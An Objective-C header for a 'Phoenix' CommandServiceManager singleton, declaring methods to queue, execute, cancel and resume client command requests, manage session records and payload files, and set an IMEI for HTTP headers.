//  Project name: Phoenix
//  Version -1.00
//
//  CommandServiceManager.h
//  CommandServiceManager
//
//  Created by Pichaya Srifar on 7/29/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "CommandDelegate.h"
#import "TransportDirectiveEnum.h"
#import "NSMutableArray+PriorityQueue.h"

@class CommandDelegate;

@class SessionManager, CommandExecutor, CommandRequest, Request, CommandDelegate;

/**
 CommandServiceManager is a singleton using as Phoenix interface
 */

@interface CommandServiceManager : NSObject {
	SessionManager *sessionManager;
	CommandExecutor *executor;
	NSURL *structuredURL;
	NSURL *unstructuredURL;
	NSString *payloadPath;
	NSString *databasePath;
	NSMutableArray *priorityQueue;
}

/**
 Get singleton CommandServiceManager object
 @returns shared CommandServiceManager instance
 @warning don't use this, it does not set db path for session manager. Use sharedManagerWithPayloadPath:withDBPath: instead																	
 */
+ (CommandServiceManager *)sharedManager;

/**
 Get singleton CommandServiceManager object then set payload path and database path at that time
 @returns shared CommandServiceManager instance that have payload path and database path
 @param PLPath writable path to save payload file
 @param DBPath writable path to crate/read/update database file
 */
+ (CommandServiceManager *)sharedManagerWithPayloadPath:(NSString *)PLPath withDBPath:(NSString *)DBPath; // use this

/**
 Execute a request, will put in to queue and start executor if it's idle
 @param CSID the client session id wanted to delete
 @returns Client session id of the request
 */
- (long)execute:(CommandRequest *)request;


/**
 Cancel a request by client session id
 @param CSID the client session id wanted to cancel
 */
- (void)cancelRequest:(uint32_t)CSID;

/**
 Delete a session from database by client session id
 @param CSID the client session id wanted to delete
 */
- (void)deleteSession:(uint32_t)CSID;

/**
 Delete a session from database and playload if already crated by client session id
 @param CSID the client session id wanted to delete
 */
- (void)deleteSessionPayload:(uint32_t)CSID;

/**
 Get all client session ids that payload is not finished yet
 @returns array of client session id that payload_ready_flag=0
 */
- (NSArray *)getAllOrphanedSession;

/**
 Get all client session ids that payload is finished
 @returns array of client session id that payload_ready_flag=1
 */
- (NSArray *)getAllPendingSession;

/**
 Resume a request that have this client session id and set callback object
 @param CSID client session id that wanted to resume
 @param delegate callback object
 */
- (void)resume:(uint32_t)CSID withDelegate:(id<CommandDelegate>)delegate;

/**
 For test cancel flow it will cancel the first request in the queue 
 */
- (void)testCancelRequest;

/**
 Pop request from queue
 @returns the highest priorty request in queue
 */
- (Request *)deQueue;

/**
 Set IMEI to CSM for using in http headers
 @no return
 */
- (void) setIMEI: (NSString *) aIMEI;

@property (nonatomic, retain) NSURL *structuredURL;
@property (nonatomic, retain) NSURL *unstructuredURL;
@property (nonatomic, retain) NSString *payloadPath;
@property (nonatomic, retain) NSString *databasePath;

/**
 Weak link to SessionManager shared instance
 */
@property (nonatomic, assign) SessionManager *sessionManager;

/**
 Weak link to CommandExecutor shared instance
 */
@property (nonatomic, assign) CommandExecutor *executor;

/**
 Priority queue NSMutableArray category
 */
@property (nonatomic, retain) NSMutableArray *priorityQueue;

@end
